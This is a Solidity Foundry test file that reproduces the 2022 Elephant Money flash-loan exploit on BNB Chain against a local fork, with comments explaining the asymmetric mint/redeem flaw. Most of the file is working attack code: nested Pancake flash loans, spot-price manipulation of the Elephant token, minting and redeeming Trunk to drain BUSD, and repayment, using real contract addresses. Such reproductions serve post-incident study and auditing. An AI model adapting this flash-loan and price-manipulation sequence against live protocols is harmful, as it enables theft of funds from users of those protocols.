// SPDX-License-Identifier: UNLICENSED
//Credit: W2Ning
// PoC for 2022-04-Elephant_Money hack (BSC).
// This file demonstrates the full exploit using flash-loans + price manipulation against
// the Elephant/Trunk protocol. See detailed VULNERABILITY comment inside ContractTest.
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    // VULNERABILITY: Asymmetric mint/redeem + spot-price-dependent Elephant buyback in unverified Trunk router (InotVerified)
    // Root cause: InotVerified.mint(BUSD_amount) pulls BUSD, mints Trunk at fixed ~0.99 ratio to caller, *and* performs
    // an internal buyback swap (BUSD -> Elephant via router) sending Elephant to treasury. redeem(Trunk_amount) burns Trunk
    // and returns (near) full nominal BUSD without any reverse Elephant sell or price-based adjustment.
    // No TWAP, no slippage guard, no reentrancy/price sanity. Elephant is a 10% fee-on-transfer token vs WBNB on Pancake.
    // Impact: Attacker with flash capital can force protocol to acquire backing (Elephant) at manipulated high price,
    // extract the BUSD "spent" via immediate redeem (which ignores the buyback cost), leaving under-backed Trunk
    // for other users. ~real-world loss was millions in BUSD. The fixed haircut + one-way buyback creates extractable gap
    // whenever Elephant spot price can be inflated atomically.
    // Code refs: not_verified.mint(L78), not_verified.redeem(L92), path_1 buy (L70), path_2 sell (L84), nested pancakeCall(L60)
    // EXPLOIT STEPS:
    // 1. Flash-loan 100k WBNB (from BUSDT_WBNB_Pair) + nested 90M BUSD (from BUSD_USDT_Pair) via pancakeCall reentrancy.
    // 2. wbnb.withdraw + router.swapExactETHForTokensSupportingFeeOnTransferTokens (buy Elephant) -> inflates Elephant/WBNB price.
    // 3. not_verified.mint(90M BUSD) -> protocol pulls BUSD, mints Trunk@0.99, does internal buy-Elephant at *inflated* price (acquires less backing per BUSD).
    // 4. Sell attacker's Elephant back for WBNB (path_2) at the still-favorable (pre-dump) rate.
    // 5. not_verified.redeem(all Trunk) -> receive full BUSD (more than the internal buyback "spent"), no symmetric Elephant sale.
    // 6. Dump any residual Elephant for WBNB, repay flashes with small premium (100.3k / 90.3M), keep profit in BUSD/WBNB.
    // 7. Profit realized because redeem payout decoupled from the buyback cost and price was not time-weighted.

    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));

    address public BUSD_USDT_Pair = 0x7EFaEf62fDdCCa950418312c6C91Aef321375A00;

    address public elephant_wbnb_Pair = 0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;

    address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;

    address[] path_1 = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688];

    address[] path_2 = [0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c];

    address[] path_3 = [0xdd325C38b12903B727D16961e61333f4871A70E0, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];

    address[] path_4 = [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56];

    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IERC20 elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);

    IERC20 Trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    InotVerified not_verified = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    constructor() {
        cheats.createSelectFork("http://127.0.0.1:8546", 16_886_438); // fork bsc block number 16886438

        elephant.approve(address(router), type(uint256).max);

        Trunk.approve(address(router), type(uint256).max);

        // Approvals to the unverified InotVerified contract are required because mint/redeem
        // do internal transferFrom of BUSD (for deposit) and of Trunk (for burn on redeem).
        // Lack of any other access control or size limits on these calls is part of the vuln surface.
        Trunk.approve(address(not_verified), type(uint256).max);

        busd.approve(address(not_verified), type(uint256).max);

        wbnb.approve(address(router), type(uint256).max);
    }

    function testExploit() public {
        // Flash loan entry point: starts the WBNB flash (outer), which triggers inner BUSD flash.
        // Uses Pancake V2 flash-swap (no fee if repaid in same tx) + callback to attacker contract.
        IPancakePair(BUSDT_WBNB_Pair).swap(0, 100_000 ether, address(this), "0x00");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        sender;
        data;
        amount0;
        amount1;

        if (msg.sender == BUSDT_WBNB_Pair) {
            // VULNERABILITY: Nested flash loan via pancakeCall allows atomic price manipulation + mint/redeem
            // without upfront capital and without repaying until after profit extraction.
            // The if/else dispatches outer WBNB flash -> inner BUSD flash -> attack().
            IPancakePair(BUSD_USDT_Pair).swap(0, 90_000_000 ether, address(this), "0x00");
        } else {
            attack();
        }
    }

    function attack() public {
        // === PRICE MANIPULATION (using WBNB flash capital) ===
        wbnb.withdraw(100_000 ether);

        // VULNERABILITY: Large spot-price manipulation of Elephant via direct AMM buy.
        // swapExactETHForTokensSupportingFeeOnTransferTokens (path_1: WBNB->Elephant) removes Elephant liquidity
        // from elephant_wbnb_Pair, inflating Elephant price (WBNB per Elephant). The 10% fee-on-transfer is paid
        // but does not prevent the massive imbalance. This inflated price is visible to the *next* call.
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(
            0, path_1, address(this), block.timestamp
        );

        uint256 balance_elephant = elephant.balanceOf(address(this));

        emit log_named_uint("The elephant after swapping", balance_elephant / 1e9);

        // === MINT AT INFLATED PRICE (internal buyback suffers) ===
        // VULNERABILITY: not_verified.mint pulls BUSD (90M from flash), mints Trunk at fixed ratio,
        // and *inside* mint performs Elephant buyback using BUSD at the just-inflated price.
        // Because price is high, the buyback acquires *less* Elephant for the BUSD portion allocated to buyback.
        // The protocol's backing (Elephant) is obtained expensively/inefficiently; this "spent" BUSD
        // is no longer available to fully back the newly minted Trunk.
        not_verified.mint(90_000_000 ether);

        uint256 balance_Trunk = Trunk.balanceOf(address(this));

        emit log_named_uint("The Trunk after minting", balance_Trunk / 1e18);

        // Sell the (pre-mint) Elephant position back; this may also help dump price after internal buy.
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balance_elephant, 0, path_2, address(this), block.timestamp
        );

        emit log_named_uint("The WBNB Balance after swaping", wbnb.balanceOf(address(this)) / 1e18);

        balance_Trunk = Trunk.balanceOf(address(this));

        // === REDEEM (asymmetric payout) ===
        // VULNERABILITY: redeem(Trunk) returns ~full BUSD value based on minted nominal amount,
        // without undoing the Elephant buyback or checking current price / backing.
        // Attacker receives more BUSD on redeem than was "lost" to the (expensive) internal buyback.
        // This is the profit extraction. No state coupling between the buy in mint() and the payout in redeem().
        not_verified.redeem(balance_Trunk);

        emit log_named_uint("The BUSD after redeeming", busd.balanceOf(address(this)) / 1e18);

        uint256 b3 = elephant.balanceOf(address(this));

        emit log_named_uint("The elephant after redeeming", b3 / 1e9);

        // Any Elephant received during redeem (or residuals) is also swapped to WBNB.
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path_2, address(this), block.timestamp);

        emit log_named_uint("The WBNB Balance before paying back", wbnb.balanceOf(address(this)) / 1e18);

        // Repay the outer WBNB flash (with ~0.3% premium typical for these PoCs)
        wbnb.transfer(BUSDT_WBNB_Pair, 100_300 ether);

        // Convert leftover WBNB profit to BUSD for final accounting / flash repay
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path_4, address(this), block.timestamp
        );

        emit log_named_uint("The BUSD before paying back", busd.balanceOf(address(this)) / 1e18);

        // Repay inner BUSD flash (with premium)
        busd.transfer(BUSD_USDT_Pair, 90_300_000 ether);

        emit log_named_uint("The BUSD after paying back", busd.balanceOf(address(this)) / 1e18);
    }

    receive() external payable {}
}
